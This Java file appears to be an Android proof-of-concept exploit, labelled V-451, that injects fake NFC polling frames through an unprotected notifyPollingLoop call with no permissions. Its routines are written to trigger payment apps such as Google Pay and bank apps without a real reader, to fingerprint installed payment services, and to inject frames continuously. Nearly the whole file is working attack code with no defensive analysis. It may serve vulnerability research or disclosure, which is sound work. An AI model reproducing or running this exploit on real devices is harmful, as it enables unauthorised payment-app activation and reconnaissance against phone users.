package com.poc.nfchijack;

import android.os.Handler;
import android.os.HandlerThread;
import android.util.Log;

/**
 * V-451 PoC: Injects fake NFC polling loop frames into the NFC controller.
 *
 * ZERO permissions required. Calls INfcAdapter.notifyPollingLoop() which has
 * no permission check in NfcService (Android 15+).
 *
 * This can:
 * 1. Trigger HCE services that have registered PollingLoopFilter patterns
 * 2. Activate payment apps (Google Pay, bank apps) without physical NFC proximity
 * 3. Fingerprint which NFC payment services are installed
 * 4. In observe mode, force apps out of observe mode into active emulation
 */
public class PollingInjector {
    private static final String TAG = "PollingInjector";

    // PollingFrame type constants (ASCII char values)
    public static final int TYPE_A = 'A';    // NFC-A (ISO 14443-3A) — used by Visa/Mastercard
    public static final int TYPE_B = 'B';    // NFC-B (ISO 14443-3B)
    public static final int TYPE_F = 'F';    // NFC-F (FeliCa) — used by transit
    public static final int TYPE_ON = 'O';   // Polling loop ON
    public static final int TYPE_OFF = 'X';  // Polling loop OFF
    public static final int TYPE_UNKNOWN = 'U';

    // Standard NFC-A commands
    private static final byte[] WUPA_CMD = {0x52};           // Wake-Up command (Type A)
    private static final byte[] REQA_CMD = {0x26};           // Request command (Type A)
    private static final byte[] RATS_CMD = {(byte) 0xE0, 0x50}; // Request for Answer To Select

    // Visa/Mastercard SELECT AID APDUs (for triggering specific payment apps)
    private static final byte[] SELECT_PPSE = {
            0x00, (byte) 0xA4, 0x04, 0x00, 0x0E,             // SELECT header
            0x32, 0x50, 0x41, 0x59, 0x2E, 0x53, 0x59, 0x53,  // "2PAY.SYS"
            0x2E, 0x44, 0x44, 0x46, 0x30, 0x31,              // ".DDF01"
            0x00                                               // Le
    };

    private HandlerThread mThread;
    private Handler mHandler;
    private boolean mRunning = false;
    private int mInjectCount = 0;

    public void start() {
        if (mRunning) return;
        mThread = new HandlerThread("PollingInjector");
        mThread.start();
        mHandler = new Handler(mThread.getLooper());
        mRunning = true;

        Log.w(TAG, "[V-451] Starting polling frame injection");
        mHandler.post(mInjectRunnable);
    }

    public void stop() {
        mRunning = false;
        if (mHandler != null) mHandler.removeCallbacks(mInjectRunnable);
        if (mThread != null) mThread.quitSafely();
        Log.w(TAG, "[V-451] Stopped. Total injections: " + mInjectCount);
    }

    /**
     * Inject a single polling sequence mimicking a real NFC reader.
     * A real reader sends: ON → REQA/WUPA → RATS → ... → OFF
     */
    public boolean injectFullPollingSequence() {
        boolean success = true;

        // Step 1: Polling loop ON
        success &= ReflectionHelper.callNotifyPollingLoop(TYPE_ON, new byte[0], 0);

        // Step 2: NFC-A WUPA (Wake-Up) — this triggers PollingLoopFilter on payment apps
        success &= ReflectionHelper.callNotifyPollingLoop(TYPE_A, WUPA_CMD, 128);

        // Step 3: Another NFC-A frame with higher gain (simulates reader getting closer)
        success &= ReflectionHelper.callNotifyPollingLoop(TYPE_A, REQA_CMD, 200);

        // Step 4: Polling loop OFF
        success &= ReflectionHelper.callNotifyPollingLoop(TYPE_OFF, new byte[0], 0);

        if (success) mInjectCount++;
        return success;
    }

    /**
     * Inject NFC-A frames specifically to trigger auto-transact on payment apps
     * that have registered PollingLoopFilter for NFC-A.
     */
    public boolean injectPaymentTrigger() {
        // Simulate a payment terminal's polling pattern:
        // Multiple rapid NFC-A polls with increasing gain (approaching reader)
        boolean success = true;
        success &= ReflectionHelper.callNotifyPollingLoop(TYPE_ON, new byte[0], 0);

        for (int gain = 50; gain <= 250; gain += 50) {
            success &= ReflectionHelper.callNotifyPollingLoop(TYPE_A, WUPA_CMD, gain);
            try { Thread.sleep(10); } catch (InterruptedException ignored) {}
        }

        success &= ReflectionHelper.callNotifyPollingLoop(TYPE_OFF, new byte[0], 0);
        return success;
    }

    /**
     * Fingerprint installed HCE services by injecting different technology types
     * and observing which services become active.
     */
    public void fingerprintServices() {
        Log.i(TAG, "[V-451] Fingerprinting NFC services...");

        // Inject NFC-A (Visa/Mastercard/most payment)
        ReflectionHelper.callNotifyPollingLoop(TYPE_A, WUPA_CMD, 128);
        Log.i(TAG, "  Injected NFC-A frame");

        // Inject NFC-B (some EMV cards)
        ReflectionHelper.callNotifyPollingLoop(TYPE_B, new byte[]{0x05, 0x00, 0x08}, 128);
        Log.i(TAG, "  Injected NFC-B frame");

        // Inject NFC-F (FeliCa / transit)
        ReflectionHelper.callNotifyPollingLoop(TYPE_F, new byte[]{0x06, 0x00}, 128);
        Log.i(TAG, "  Injected NFC-F frame");
    }

    private final Runnable mInjectRunnable = new Runnable() {
        @Override
        public void run() {
            if (!mRunning) return;

            boolean success = injectFullPollingSequence();
            if (!success && mInjectCount == 0) {
                Log.e(TAG, "[V-451] First injection failed — notifyPollingLoop may be protected on this build");
                mRunning = false;
                return;
            }

            if (mInjectCount % 50 == 0) {
                Log.i(TAG, "[V-451] Injection count: " + mInjectCount);
            }

            if (mRunning) {
                // Inject every 200ms (5 Hz) — mimics a real NFC reader's poll rate
                mHandler.postDelayed(this, 200);
            }
        }
    };

    public boolean isRunning() { return mRunning; }
    public int getInjectCount() { return mInjectCount; }
}
